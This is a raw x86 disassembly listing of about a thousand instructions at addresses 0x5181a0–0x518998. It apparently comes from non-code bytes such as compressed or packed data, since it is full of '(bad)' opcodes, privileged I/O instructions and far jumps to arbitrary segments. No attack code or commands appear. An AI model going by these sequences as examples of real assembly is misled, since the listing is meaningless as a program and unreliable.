  5181a0:	outs   dx,BYTE PTR ds:[esi]
  5181a1:	jnp    0x51821b
  5181a3:	(bad)  
  5181a4:	cmp    BYTE PTR [edi],al
  5181a6:	and    eax,0xd722bd4
  5181ab:	jbe    0x5181b6
  5181ad:	imul   BYTE PTR [edi+0x54e3f308]
  5181b3:	gs into 
  5181b5:	fdiv   st,st(7)
  5181b7:	inc    esi
  5181b8:	adc    al,0x5e
  5181ba:	push   esp
  5181bb:	pop    ds
  5181bc:	shr    edx,1
  5181be:	into   
  5181bf:	add    edx,DWORD PTR [ebx-0x4f]
  5181c2:	mov    al,0x1c
  5181c4:	inc    esi
  5181c5:	int    0x24
  5181c7:	pop    ebx
  5181c8:	test   dh,bl
  5181ca:	dec    esp
  5181cb:	adc    ch,ch
  5181cd:	adc    ebp,DWORD PTR [eax]
  5181cf:	gs ret 0xd107
  5181d3:	pop    ebp
  5181d4:	xchg   edi,eax
  5181d5:	xlat   BYTE PTR ds:[ebx]
  5181d6:	out    0x96,eax
  5181d8:	in     al,dx
  5181d9:	sub    al,0x16
  5181db:	das    
  5181dc:	and    dl,BYTE PTR ds:0x6bd325dc
  5181e2:	lods   al,BYTE PTR ds:[esi]
  5181e3:	in     eax,0x63
  5181e5:	rcl    BYTE PTR [eax+edx*2+0x7c],0x1b
  5181ea:	leave  
  5181eb:	and    ebp,DWORD PTR [esp+esi*2-0x56d2ea16]
  5181f2:	adc    eax,0x76341119
  5181f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5181f8:	inc    ecx
  5181f9:	push   esi
  5181fa:	push   edi
  5181fb:	push   ebp
  5181fc:	pop    ds
  5181fd:	lods   eax,DWORD PTR ds:[esi]
  5181fe:	mov    fs,WORD PTR [ecx+ebp*1-0x58342b4e]
  518205:	xchg   edi,eax
  518206:	je     0x518273
  518208:	cmp    eax,DWORD PTR [ecx-0xe1e0756]
  51820e:	jae    0x5181ec
  518210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  518211:	popf   
  518212:	mov    cl,0x70
  518214:	mov    WORD PTR [ebp+0x448a08db],es
  51821a:	mov    ebp,0x2ecd5f1e
  51821f:	sahf   
  518220:	hlt    
  518221:	sub    al,0x85
  518223:	clc    
  518224:	mov    DWORD PTR [eax-0x4f4dc748],ebp
  51822a:	mov    BYTE PTR [esi],ch
  51822c:	das    
  51822d:	out    dx,eax
  51822e:	pop    eax
  51822f:	shl    ebp,cl
  518231:	jmp    0x1d01d582
  518236:	push   edx
  518237:	(bad)  
  518239:	dec    ebp
  51823a:	cwd    
  51823c:	mov    dl,0x35
  51823e:	bound  esp,QWORD PTR ss:[esi-0x72]
  518242:	cwde   
  518243:	jbe    0x5182a3
  518245:	and    BYTE PTR [ebx-0x50c0125a],bl
  51824b:	mov    dl,0x65
  51824d:	leave  
  51824e:	fist   WORD PTR [edx+0x44]
  518251:	add    ebx,DWORD PTR [ebp+0x24]
  518254:	mov    fs,ebx
  518256:	popf   
  518257:	sub    cl,BYTE PTR [ebx]
  518259:	ja     0x518228
  51825b:	mov    esi,0x5097f274
  518260:	mov    eax,ds:0x6df5e1b6
  518265:	xor    al,0xc3
  518267:	dec    edx
  518268:	fld    TBYTE PTR [ecx+ebx*8+0x2]
  51826c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51826d:	popa   
  51826e:	(bad)  
  51826f:	jnp    0x5182ea
  518271:	(bad)  
  518272:	push   edi
  518273:	cmp    eax,0x48d5e369
  518278:	mov    DWORD PTR [esi],edx
  51827a:	ffree  st(0)
  51827c:	idiv   BYTE PTR [ecx]
  51827e:	mov    dl,0xce
  518280:	ins    DWORD PTR es:[edi],dx
  518281:	and    eax,0x6800ad89
  518286:	jg     0x518299
  518288:	stc    
  518289:	jle    0x518274
  51828b:	cmp    al,0xd0
  51828d:	mov    WORD PTR [edi-0x320bd419],gs
  518293:	mov    bh,0x8f
  518295:	cmc    
  518296:	fwait
  518297:	push   esi
  518298:	std    
  518299:	xchg   esi,eax
  51829a:	fisubr WORD PTR [ecx+esi*8]
  51829d:	push   0xa76300a2
  5182a2:	fdivr  QWORD PTR [ebx]
  5182a4:	not    DWORD PTR [ebp+edx*8-0x4d570089]
  5182ab:	int    0x8d
  5182ad:	xchg   esi,eax
  5182ae:	stos   DWORD PTR es:[edi],eax
  5182af:	cld    
  5182b0:	push   esp
  5182b1:	jae    0x518309
  5182b3:	pusha  
  5182b4:	cmp    eax,0x73556a32
  5182b9:	jle    0x518273
  5182bb:	iret   
  5182bc:	xchg   DWORD PTR [esi-0x9097e81],ebp
  5182c2:	inc    ebx
  5182c3:	outs   dx,DWORD PTR ds:[esi]
  5182c4:	inc    edi
  5182c5:	daa    
  5182c6:	inc    esp
  5182c7:	shl    DWORD PTR [ecx-0xd],0xa9
  5182cb:	cmp    dl,BYTE PTR [ebp-0x7c]
  5182ce:	mov    eax,0x451ab3cd
  5182d3:	call   0x30b3d08d
  5182d8:	movhps QWORD PTR [edi+0x2fce2bdc],xmm7
  5182df:	dec    edi
  5182e0:	fcom   DWORD PTR [esi-0x6d86746a]
  5182e6:	fcom   DWORD PTR [si-0x1d]
  5182ea:	cmp    edi,esi
  5182ec:	jb     0x518281
  5182ee:	(bad)  
  5182ef:	mov    ds:0x4fbfdc1b,eax
  5182f4:	push   eax
  5182f5:	inc    edx
  5182f6:	inc    edx
  5182f7:	nop
  5182f8:	or     BYTE PTR [edx-0x3e976191],dl
  5182fe:	adc    dh,bh
  518300:	xor    al,0x79
  518302:	and    ah,cl
  518304:	shl    BYTE PTR [ebx+0x16],cl
  518307:	(bad)  
  518308:	fcom   DWORD PTR [ebx-0x707561e]
  51830e:	mov    al,ds:0x57d8fde2
  518313:	xor    eax,0xf804f4a
  518318:	push   0x1
  51831a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51831b:	push   esi
  51831c:	sbb    dl,BYTE PTR [ebx]
  51831e:	mov    eax,0x56228388
  518323:	scas   eax,DWORD PTR es:[edi]
  518324:	adc    BYTE PTR [esi+esi*1],dh
  518327:	cld    
  518328:	scas   eax,DWORD PTR es:[edi]
  518329:	cld    
  51832a:	shl    BYTE PTR [esi],cl
  51832c:	sbb    DWORD PTR [ecx+0x5ff79760],0x533b237e
  518336:	jne    0x518337
  518338:	inc    edi
  518339:	jmp    0x518319
  51833b:	or     eax,0x67f06e39
  518340:	inc    esi
  518341:	shl    DWORD PTR [ebx+0x36f8078f],1
  518347:	test   eax,0xfdf22964
  51834c:	mov    edx,0x223bc6e9
  518351:	inc    ecx
  518352:	aaa    
  518353:	pop    eax
  518354:	aaa    
  518355:	inc    ebx
  518356:	mul    BYTE PTR [edx+0x14]
  518359:	adc    BYTE PTR [esi+0x3f35d344],dh
  51835f:	jae    0x5183b1
  518361:	pusha  
  518362:	xor    al,0x4d
  518364:	icebp  
  518365:	je     0x51836c
  518367:	dec    ebp
  518368:	pop    ss
  518369:	fs cdq 
  51836b:	(bad)  
  51836c:	gs jns 0x5183b5
  51836f:	sbb    BYTE PTR [eax+0x14],bl
  518372:	jae    0x5183da
  518374:	inc    ebp
  518375:	cld    
  518376:	test   eax,0x4ac25552
  51837b:	dec    edi
  51837c:	in     al,0x5e
  51837e:	sti    
  51837f:	add    BYTE PTR [edx],cl
  518381:	mul    al
  518383:	(bad)  [ebx+0x11]
  518386:	pop    ds
  518387:	mov    cl,BYTE PTR [ebx-0x2e]
  51838a:	xor    al,0x40
  51838c:	(bad)
  518390:	xchg   ebx,eax
  518391:	(bad)  
  518392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  518393:	inc    ebp
  518394:	data16 sahf 
  518396:	fimul  WORD PTR [ebx-0x3]
  518399:	mov    ds:0x85703493,eax
  51839e:	daa    
  51839f:	or     ecx,eax
  5183a1:	sub    cl,ch
  5183a3:	or     eax,0x629ed5e
  5183a8:	jmp    0x5183be
  5183aa:	(bad)  
  5183ab:	mov    esp,0xc789e487
  5183b0:	pop    ebp
  5183b1:	ret    
  5183b2:	test   al,0x3b
  5183b4:	js     0x518396
  5183b6:	stos   BYTE PTR es:[edi],al
  5183b7:	mov    ecx,DWORD PTR [esi-0x48eb888e]
  5183bd:	outs   dx,BYTE PTR ds:[esi]
  5183be:	cld    
  5183bf:	add    BYTE PTR [ebx-0x42bb3139],ch
  5183c5:	in     al,0x3
  5183c7:	mov    cl,0xd4
  5183c9:	(bad)  
  5183ca:	push   DWORD PTR [ebp-0x7c131f5b]
  5183d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5183d1:	pop    esp
  5183d2:	mov    DWORD PTR ds:0x11dfe3b,edx
  5183d8:	cdq    
  5183d9:	jg     0x518419
  5183db:	ss aas 
  5183dd:	popa   
  5183de:	sub    BYTE PTR [edx+0x4f],ch
  5183e1:	jb     0x518462
  5183e3:	loope  0x518460
  5183e5:	cli    
  5183e6:	mov    ebp,0x65ab39fe
  5183eb:	mov    BYTE PTR [ebx],bh
  5183ed:	push   ecx
  5183ee:	fdiv   st,st(0)
  5183f0:	xor    DWORD PTR [esi],0xae328310
  5183f6:	pop    eax
  5183f7:	jb     0x5183a9
  5183f9:	stc    
  5183fa:	les    ebp,FWORD PTR [eax+0x3b]
  5183fd:	lods   eax,DWORD PTR ds:[esi]
  5183fe:	or     DWORD PTR [edx+0xb987041],edx
  518404:	cli    
  518405:	xchg   esp,eax
  518406:	pop    ds
  518407:	sbb    cl,BYTE PTR [edi-0x1e]
  51840a:	imul   edi,DWORD PTR [esi+0x40],0xffffffec
  51840e:	push   cs
  51840f:	icebp  
  518410:	push   ebp
  518411:	mov    al,ds:0xcfe0cd52
  518416:	and    BYTE PTR [edx+ebp*4],dh
  518419:	(bad)  
  51841a:	aaa    
  51841b:	int    0xdf
  51841d:	add    al,0xaf
  51841f:	pop    es
  518420:	jmp    0xbfcc:0x3ebc69bd
  518427:	fisttp WORD PTR [eax-0x5bf6ae94]
  51842d:	stc    
  51842e:	sbb    edx,ebx
  518430:	push   ebx
  518431:	xchg   esp,eax
  518432:	pop    ebp
  518433:	aaa    
  518434:	leave  
  518435:	cli    
  518436:	dec    ecx
  518437:	repnz pop ebx
  518439:	(bad)  
  51843a:	sahf   
  51843b:	sub    esi,DWORD PTR [ecx]
  51843d:	mov    ebx,0x532a0c5d
  518442:	pop    edi
  518443:	fsub   QWORD PTR [edx]
  518445:	sbb    eax,0x3ffbbff9
  51844a:	arpl   WORD PTR [edi],di
  51844c:	xchg   DWORD PTR [ecx+0x55],ebx
  51844f:	test   al,0xb9
  518451:	add    bh,BYTE PTR [ebx+edi*4]
  518454:	ins    DWORD PTR es:[edi],dx
  518455:	(bad)  
  518456:	aaa    
  518457:	add    DWORD PTR [edi+0x37],esp
  51845a:	jbe    0x5184bc
  51845c:	xchg   DWORD PTR [eax],esp
  51845e:	ficom  WORD PTR [edi-0x338db898]
  518464:	add    edx,esp
  518466:	jbe    0x518468
  518468:	out    dx,al
  518469:	jle    0x51847c
  51846b:	rcl    BYTE PTR [ebp-0x50],0x33
  51846f:	stos   DWORD PTR es:[edi],eax
  518470:	mov    dl,0xa6
  518472:	aam    0x64
  518474:	popa   
  518475:	or     DWORD PTR [ebp+0x5ff69351],0xde67e620
  51847f:	imul   eax,DWORD PTR [ecx+0x1e],0xb62cbed6
  518486:	and    ecx,ecx
  518488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  518489:	mov    edx,0xf648e75c
  51848e:	push   eax
  51848f:	cmp    eax,0x1848f957
  518494:	not    eax
  518496:	lahf   
  518497:	mov    ch,0x29
  518499:	loop   0x51845f
  51849b:	xor    BYTE PTR [ecx],bh
  51849d:	mov    ebx,DWORD PTR [edx-0x280fefc0]
  5184a3:	fimul  WORD PTR [ebx+edi*2-0x3]
  5184a7:	sbb    esp,DWORD PTR [edi+0x13]
  5184aa:	scas   eax,DWORD PTR es:[edi]
  5184ab:	(bad)  
  5184ac:	xchg   ebx,eax
  5184ad:	cld    
  5184ae:	rol    ebp,cl
  5184b0:	in     eax,dx
  5184b1:	mov    bh,0x9b
  5184b3:	xchg   DWORD PTR [edx-0x2c64e883],esp
  5184b9:	push   edx
  5184ba:	inc    esp
  5184bb:	xor    BYTE PTR [ecx],dh
  5184bd:	mov    esi,0x58e801ad
  5184c2:	cmp    bh,ah
  5184c4:	sti    
  5184c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5184c6:	mov    eax,ds:0x4c164817
  5184cb:	nop
  5184cc:	mov    dl,0xb0
  5184ce:	shl    BYTE PTR [esi],1
  5184d0:	aaa    
  5184d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5184d2:	and    eax,0x274304b8
  5184d7:	pop    ds
  5184d8:	jbe    0x51846a
  5184da:	or     ebx,DWORD PTR [ebx]
  5184dc:	call   0x4143e85c
  5184e1:	dec    ebx
  5184e2:	xchg   ecx,eax
  5184e3:	jnp    0x518477
  5184e5:	loopne 0x5184c5
  5184e7:	add    ch,BYTE PTR [ebx-0x10]
  5184ea:	call   0x7479afc1
  5184ef:	fst    DWORD PTR [ecx+edx*8-0x8]
  5184f3:	cmp    ecx,ebp
  5184f5:	xchg   edx,eax
  5184f6:	adc    al,0x39
  5184f8:	stos   BYTE PTR es:[edi],al
  5184f9:	ins    DWORD PTR es:[edi],dx
  5184fa:	aam    0x68
  5184fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5184fd:	mov    ebp,0x80685e90
  518502:	cld    
  518503:	jne    0x518552
  518505:	aaa    
  518506:	xor    DWORD PTR [ecx],0xc821cba8
  51850c:	dec    ebp
  51850d:	mov    edx,0x79adb0c
  518512:	add    eax,0x4a849228
  518517:	ins    BYTE PTR es:[edi],dx
  518518:	call   0x44158ee4
  51851d:	es jo  0x5184c6
  518520:	xchg   edi,eax
  518521:	outs   dx,DWORD PTR ds:[esi]
  518522:	jecxz  0x5184d3
  518524:	test   DWORD PTR [edx-0x6ff6656f],ebx
  51852a:	loop   0x518590
  51852c:	xlat   BYTE PTR ds:[ebx]
  51852d:	mov    eax,0xb859eafa
  518532:	cmp    DWORD PTR [edi],edi
  518534:	sbb    DWORD PTR [eax],0xf18b0112
  51853a:	adc    BYTE PTR [ebp+0x1e3b2ce9],dh
  518540:	fld    DWORD PTR [ebx]
  518542:	mov    bl,0xf2
  518544:	loop   0x5184d7
  518546:	mov    dh,0x99
  518548:	cdq    
  518549:	adc    al,0xcb
  51854b:	jo     0x51857f
  51854d:	scas   eax,DWORD PTR es:[edi]
  51854e:	xor    esi,DWORD PTR [ecx+0x70]
  518551:	in     eax,dx
  518552:	xor    bl,al
  518554:	out    0x5,eax
  518556:	mov    al,ds:0x39ca92cf
  51855b:	jle    0x51850c
  51855d:	mov    BYTE PTR [edi],ah
  51855f:	jge    0x518557
  518561:	inc    ebp
  518562:	pusha  
  518563:	push   eax
  518564:	aad    0x3f
  518566:	jno    0x518599
  518568:	cmp    al,0x65
  51856a:	cmp    al,0xd3
  51856c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51856d:	call   0x87c0:0xc6764255
  518574:	jp     0x5185b9
  518576:	int3   
  518577:	or     BYTE PTR [edx-0x63cfdc97],dh
  51857d:	push   0x74
  51857f:	dec    ebp
  518580:	ror    DWORD PTR [edi+0x3e],0xf5
  518584:	pop    ss
  518585:	add    dx,WORD PTR [ebp+0x49]
  518589:	mov    al,ds:0xf71e929
  51858e:	int3   
  51858f:	(bad)  
  518590:	(bad)  
  518591:	mov    al,ds:0x8c4fe0f7
  518596:	jmp    0x4c52:0xe42127d2
  51859d:	pop    ss
  51859e:	xchg   edx,eax
  51859f:	sbb    DWORD PTR [edx],0x1b4e5e2
  5185a5:	fs xchg ecx,eax
  5185a7:	cmc    
  5185a8:	cmp    eax,0x505d13c1
  5185ad:	test   BYTE PTR [eax-0x53],bh
  5185b0:	test   eax,0x2c356c8e
  5185b5:	mov    DWORD PTR [edi-0x57],edi
  5185b8:	dec    ecx
  5185b9:	into   
  5185ba:	sbb    ebx,esp
  5185bc:	je     0x5185ce
  5185be:	sub    eax,0xf512b8f5
  5185c3:	hlt    
  5185c4:	and    eax,0x5f28050a
  5185c9:	aad    0xd0
  5185cb:	pop    edx
  5185cc:	adc    eax,0x813ae1f6
  5185d1:	stc    
  5185d2:	jmp    0x5d99:0x9c280a1b
  5185d9:	mov    bl,BYTE PTR [esi+0x39a17993]
  5185df:	push   ss
  5185e0:	adc    bl,BYTE PTR [edx-0x13]
  5185e3:	lods   eax,DWORD PTR ds:[esi]
  5185e4:	je     0x518601
  5185e6:	cld    
  5185e7:	das    
  5185e8:	jmp    0x51861e
  5185ea:	rcr    DWORD PTR [ebp+ebp*4+0x70331e8c],cl
  5185f1:	rcl    DWORD PTR [edi+0x6b9223c6],0xa7
  5185f8:	and    bl,BYTE PTR [ecx+0x77fd2148]
  5185fe:	mov    ds:0x5e5f6b6c,eax
  518603:	xchg   ebp,eax
  518604:	nop
  518605:	xchg   esp,eax
  518606:	mov    ch,0xaf
  518608:	(bad)  
  518609:	push   ss
  51860a:	mov    eax,0x3ecd0833
  51860f:	jp     0x518616
  518611:	hlt    
  518612:	in     al,0xb5
  518614:	cmp    ebx,esp
  518616:	repz sbb esp,ecx
  518619:	sbb    eax,0xc2800233
  51861e:	xchg   esi,eax
  51861f:	fisub  DWORD PTR [edi+0x7e]
  518622:	mov    eax,ds:0x9bb1dc71
  518627:	jbe    0x5185fd
  518629:	adc    eax,0x865296ba
  51862e:	dec    eax
  51862f:	mov    ds:0xc87ff2e9,al
  518634:	pop    eax
  518635:	int3   
  518636:	scas   al,BYTE PTR es:[edi]
  518637:	cdq    
  518638:	jae    0x5185e7
  51863a:	xchg   esi,eax
  51863b:	cmp    eax,0x1b74bbbe
  518640:	pop    edi
  518641:	out    dx,al
  518642:	les    edi,FWORD PTR [edi]
  518644:	rcl    ebx,1
  518646:	pop    edi
  518647:	lods   eax,DWORD PTR ds:[esi]
  518648:	xchg   esi,eax
  518649:	pop    es
  51864a:	mov    ebx,0xc4383fd5
  51864f:	push   esp
  518650:	push   0xffffffef
  518652:	cmp    dl,BYTE PTR [esi-0x5d]
  518655:	jbe    0x5186cf
  518657:	or     BYTE PTR cs:[edx],cl
  51865a:	push   ebx
  51865b:	or     BYTE PTR [ebp+0x4adca7c6],ch
  518661:	ds out 0xbd,eax
  518664:	sbb    BYTE PTR [ebp-0x362ae0bf],dl
  51866a:	sbb    al,0x84
  51866c:	mov    cl,0x46
  51866e:	push   ebx
  51866f:	push   ebp
  518670:	push   esp
  518671:	adc    BYTE PTR [edi+ebp*1],bl
  518674:	(bad)  
  518675:	aaa    
  518676:	jb     0x518619
  518678:	rcr    al,cl
  51867a:	sbb    al,0xae
  51867c:	arpl   ax,ax
  51867e:	loop   0x5186c5
  518680:	sbb    eax,0x4375b163
  518685:	jmp    0x5186f3
  518687:	inc    edx
  518688:	dec    ebx
  518689:	pop    ss
  51868a:	or     BYTE PTR [edi+0x363db4f9],0x89
  518691:	xlat   BYTE PTR ds:[ebx]
  518692:	and    DWORD PTR [ebx],ecx
  518694:	dec    ecx
  518695:	xor    BYTE PTR [edx],cl
  518697:	mov    bl,BYTE PTR [ecx-0x64]
  51869a:	sahf   
  51869b:	push   edx
  51869c:	dec    ebx
  51869d:	scas   eax,DWORD PTR es:[edi]
  51869e:	mov    bl,0xb
  5186a0:	mov    ah,0xdf
  5186a2:	test   bh,ch
  5186a4:	xchg   ecx,eax
  5186a5:	out    0xcd,al
  5186a7:	jno    0x1cd3d315
  5186ad:	push   esp
  5186ae:	adc    bh,BYTE PTR [edi+esi*8-0x6f2491ed]
  5186b5:	(bad)  [ebp+0x1c]
  5186b8:	jmp    0x7bc6:0x281be134
  5186bf:	jmp    0x3da4:0x3e9b104d
  5186c6:	sbb    al,BYTE PTR ds:0x36aaba24
  5186cc:	sahf   
  5186cd:	push   esi
  5186ce:	and    al,dl
  5186d0:	adc    DWORD PTR [eax],ecx
  5186d2:	sbb    al,0x98
  5186d4:	or     al,0x1e
  5186d6:	push   ebx
  5186d7:	es dec ebp
  5186d9:	retf   
  5186da:	aam    0xa9
  5186dc:	xchg   DWORD PTR [ebx+0x65ec647d],ebx
  5186e2:	and    dl,BYTE PTR [esi]
  5186e4:	or     eax,0x1db52f78
  5186e9:	pop    ebp
  5186ea:	and    al,BYTE PTR [edi+ebp*8-0x6abb3274]
  5186f1:	dec    edx
  5186f2:	fst    QWORD PTR [ecx]
  5186f4:	ror    esp,1
  5186f6:	in     al,0x16
  5186f8:	mov    ds:0xe12e8c53,eax
  5186fd:	(bad)  
  5186fe:	mov    esp,0x5579dab4
  518703:	push   esp
  518704:	int3   
  518705:	adc    BYTE PTR [edi],cl
  518707:	(bad)  
  518709:	retf   
  51870a:	sub    al,0x17
  51870c:	sbb    dl,al
  51870e:	jecxz  0x5186d0
  518710:	pop    ds
  518711:	test   BYTE PTR [esi],0x19
  518714:	xor    BYTE PTR [esi-0x19e0c909],ah
  51871a:	mov    dh,0xf
  51871c:	sub    eax,esi
  51871e:	jmp    0xa587:0xd06dab0a
  518725:	xor    BYTE PTR [edi+0x30],ch
  518728:	popf   
  518729:	imul   ebp,DWORD PTR [ebx+0x2b],0xe98f911b
  518730:	push   ss
  518731:	int3   
  518732:	repnz xor BYTE PTR [edi],dh
  518735:	dec    eax
  518736:	fdivrp st(3),st
  518738:	xor    DWORD PTR [eax+0x5c1c5ed4],ebp
  51873e:	jge    0x518786
  518740:	dec    eax
  518741:	int    0x8a
  518743:	mul    BYTE PTR [ebx]
  518745:	pushf  
  518746:	push   edi
  518747:	in     eax,dx
  518748:	arpl   WORD PTR [ebx],cx
  51874a:	repz addr16 xor dl,dh
  51874e:	retf   0xe0c0
  518751:	mov    dh,0xd7
  518753:	push   ss
  518754:	leave  
  518755:	xchg   DWORD PTR [esi-0x37ed3c08],esp
  51875b:	ins    DWORD PTR es:[edi],dx
  51875c:	pop    esi
  51875d:	pop    esp
  51875e:	jo     0x518739
  518760:	dec    esi
  518761:	bound  edx,QWORD PTR [ecx+0x1705d89c]
  518767:	outs   dx,BYTE PTR ds:[esi]
  518768:	not    DWORD PTR [edi+0x17]
  51876b:	imul   eax,eax,0xc
  51876e:	pop    edi
  51876f:	ins    DWORD PTR es:[edi],dx
  518770:	arpl   WORD PTR ds:0x7d3e5b1b,ax
  518776:	sub    cl,cl
  518778:	mov    edi,edx
  51877a:	aas    
  51877b:	sbb    DWORD PTR [ecx],ecx
  51877d:	sbb    eax,0xf364dc63
  518782:	mov    esi,0x8f7c9ee4
  518787:	arpl   WORD PTR [edx-0x44],si
  51878a:	leave  
  51878b:	inc    ecx
  51878c:	mov    al,0x27
  51878e:	pop    ecx
  51878f:	pusha  
  518790:	push   ebp
  518791:	mov    DWORD PTR [ecx+0x480a6edd],ebx
  518797:	(bad)  
  518798:	int    0x23
  51879a:	xor    esp,esi
  51879c:	and    ebx,0x86f53ce9
  5187a2:	fnstcw WORD PTR [edx+0x2d]
  5187a5:	pop    es
  5187a6:	call   0xe9f289f2
  5187ab:	fwait
  5187ac:	popf   
  5187ad:	outs   dx,DWORD PTR ds:[esi]
  5187ae:	pusha  
  5187af:	fsubr  st(4),st
  5187b1:	call   0x8d46:0x31e53c9b
  5187b8:	xchg   edi,eax
  5187b9:	loope  0x51876b
  5187bb:	adc    BYTE PTR [eax-0x6b99f186],ah
  5187c1:	push   edx
  5187c2:	call   0x85cb:0x1324297d
  5187c9:	popf   
  5187ca:	cmp    al,bl
  5187cc:	(bad)  
  5187cd:	sub    al,0x62
  5187cf:	sti    
  5187d0:	mov    eax,ds:0x9775f47e
  5187d5:	fstp   QWORD PTR [ebp+0xd]
  5187d8:	jmp    0x9184:0x174779d
  5187df:	push   ebp
  5187e0:	imul   edx,DWORD PTR [ebp+edx*4+0x7e822291],0x36
  5187e8:	jl     0x5187c8
  5187ea:	pop    eax
  5187eb:	push   esi
  5187ec:	jbe    0x518841
  5187ee:	sub    al,al
  5187f0:	clc    
  5187f1:	mov    ch,0x5e
  5187f3:	mov    edi,0x5946cd8e
  5187f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5187f9:	mov    edi,0xc2486f91
  5187fe:	in     al,0x1
  518800:	rcr    BYTE PTR [edi-0x15d91e86],1
  518806:	sbb    eax,DWORD PTR [edi]
  518808:	and    edx,esp
  51880a:	jg     0x518813
  51880c:	adc    ecx,esi
  51880e:	sub    ch,BYTE PTR [eax-0x4]
  518811:	es jae 0x5187ed
  518814:	test   ch,0x30
  518817:	scas   al,BYTE PTR es:[edi]
  518818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  518819:	ret    0xc312
  51881c:	mov    dl,0x65
  51881e:	xchg   BYTE PTR [esp+ebx*4+0x7c],bl
  518822:	out    0xf9,al
  518824:	xlat   BYTE PTR ds:[ebx]
  518825:	je     0x518885
  518827:	dec    edx
  518828:	stc    
  518829:	clc    
  51882a:	mov    ebx,0xef22a465
  51882f:	inc    ebx
  518830:	(bad)  
  518831:	aam    0x48
  518833:	mov    ds:0x78d4d427,al
  518838:	sbb    al,BYTE PTR [esp+eax*2+0x40b8fd15]
  51883f:	jge    0x51884d
  518841:	push   ss
  518842:	shl    DWORD PTR [ebx],0x97
  518845:	pop    es
  518846:	mov    dl,dl
  518848:	xlat   BYTE PTR ds:[ebx]
  518849:	call   esi
  51884b:	mov    WORD PTR [edi-0x30],es
  51884e:	fild   DWORD PTR [ecx-0x33]
  518851:	sbb    ebx,DWORD PTR [edx]
  518853:	push   edi
  518854:	pusha  
  518855:	int3   
  518856:	jo     0x518843
  518858:	enter  0xf8a7,0xe1
  51885c:	popf   
  51885d:	mov    cl,0x18
  51885f:	imul   ebx,DWORD PTR [ebx+0x5a],0x22851390
  518866:	shl    al,1
  518868:	stos   DWORD PTR es:[edi],eax
  518869:	cs dec esp
  51886b:	jg     0x518846
  51886d:	das    
  51886e:	pushf  
  51886f:	cmp    eax,eax
  518871:	fwait
  518872:	pop    ebx
  518873:	(bad)  
  518874:	push   es
  518875:	or     al,BYTE PTR [esi-0x3a]
  518878:	and    WORD PTR [ecx-0x2],0xfff2
  51887d:	(bad)  
  51887e:	mov    ecx,0x924bf308
  518883:	sti    
  518884:	cwde   
  518885:	sub    eax,0xf988d5f6
  51888a:	sbb    esp,DWORD PTR [ebx-0x616fc57a]
  518890:	add    eax,0x124d41d0
  518895:	mov    ds:0x95261cab,eax
  51889a:	stc    
  51889b:	test   ecx,edx
  51889d:	fs push ebx
  51889f:	sub    al,0x29
  5188a1:	jb     0x51884e
  5188a3:	and    bh,BYTE PTR [edi-0x77faea56]
  5188a9:	cmp    DWORD PTR ds:0xe1499c59,0xffffffe4
  5188b0:	sbb    eax,0xd7c0b96
  5188b5:	ficom  DWORD PTR [ebx+0x70116ed2]
  5188bb:	and    al,dh
  5188bd:	shr    DWORD PTR [edx-0x5f],cl
  5188c0:	fsub   DWORD PTR [edi-0x612e8e00]
  5188c6:	rol    DWORD PTR [edx],0xdc
  5188c9:	mov    ebx,DWORD PTR [edi*8-0x5052d756]
  5188d0:	cmp    eax,0x92b16b78
  5188d5:	mov    ah,0xed
  5188d7:	push   es
  5188d8:	cmp    esi,edi
  5188da:	pushf  
  5188db:	popf   
  5188dc:	push   ecx
  5188dd:	jns    0x51894d
  5188df:	sbb    eax,0x7e7ebeaa
  5188e4:	jmp    0xffa6853f
  5188e9:	and    BYTE PTR [edi+0x2f],dl
  5188ec:	sbb    edx,DWORD PTR [esi-0x3ba499e8]
  5188f2:	in     eax,0x9
  5188f4:	or     esp,DWORD PTR [ecx-0x43da40de]
  5188fa:	popf   
  5188fb:	lods   al,BYTE PTR ds:[esi]
  5188fc:	addr16 push 0xd6e1cc6b
  518902:	inc    edi
  518903:	cmp    BYTE PTR [eax+0x4cec6eb0],bh
  518909:	or     BYTE PTR [eax+0xe],dh
  51890c:	push   0xfffffff2
  51890e:	adc    eax,0xce150fb8
  518913:	sbb    BYTE PTR [ecx],bh
  518915:	xchg   BYTE PTR [eax+0x79],dl
  518918:	pop    esi
  518919:	inc    ecx
  51891a:	(bad)
  51891d:	repnz mov dh,0x69
  518920:	je     0x51893f
  518922:	or     bh,dl
  518924:	sub    BYTE PTR [ebx],ah
  518926:	jle    0x518982
  518928:	xor    eax,DWORD PTR [esi]
  51892a:	sub    eax,DWORD PTR [ebx]
  51892c:	xchg   esp,eax
  51892d:	fidiv  DWORD PTR [esp+esi*2-0x47611662]
  518934:	sti    
  518935:	mov    ds:0x424fce0,al
  51893a:	mov    esp,0x54f4003d
  51893f:	jecxz  0x5189a5
  518941:	add    eax,0x9bbb8653
  518946:	and    BYTE PTR [ecx+0x591eb707],ah
  51894c:	ja     0x51894c
  51894e:	aam    0x42
  518950:	pop    ebx
  518951:	shl    DWORD PTR [ebx-0x34417927],1
  518957:	lahf   
  518958:	cmp    esi,0xffffffa5
  51895b:	inc    esp
  51895c:	(bad)  
  51895d:	fmul   QWORD PTR [ebp-0x3a]
  518960:	inc    edx
  518961:	loope  0x5189be
  518963:	mov    edi,ebx
  518965:	leave  
  518966:	mov    ds,WORD PTR [ecx+0x5e44e524]
  51896c:	nop
  51896d:	gs lahf 
  51896f:	cmp    dh,BYTE PTR ds:0xf22e941
  518975:	add    DWORD PTR [esi+0x6d],ecx
  518978:	jb     0x518981
  51897a:	mov    edx,0xc0fc2d13
  51897f:	add    DWORD PTR [edi-0x706580e9],0x8c573227
  518989:	in     al,dx
  51898a:	and    bl,BYTE PTR [ecx-0x2a]
  51898d:	jmp    0x518a0e
  51898f:	mov    ds:0xb534c116,eax
  518994:	xchg   DWORD PTR [ebx+eax*1-0x64],eax
  518998:	imul   al
